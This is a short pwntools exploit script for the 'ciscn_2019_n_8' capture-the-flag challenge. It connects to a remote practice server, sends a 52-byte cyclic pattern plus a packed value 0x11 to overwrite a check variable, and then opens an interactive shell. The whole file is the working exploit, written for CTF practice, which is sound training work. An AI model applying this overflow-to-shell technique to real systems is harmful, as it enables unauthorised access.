from pwn import *

context.log_level = "debug"

# r = process("./ciscn_2019_n_8")
r = remote("node4.buuoj.cn", 28329)
r.recvuntil(b"?\n")
r.sendline(cyclic(52) + p32(0x11))
r.interactive()
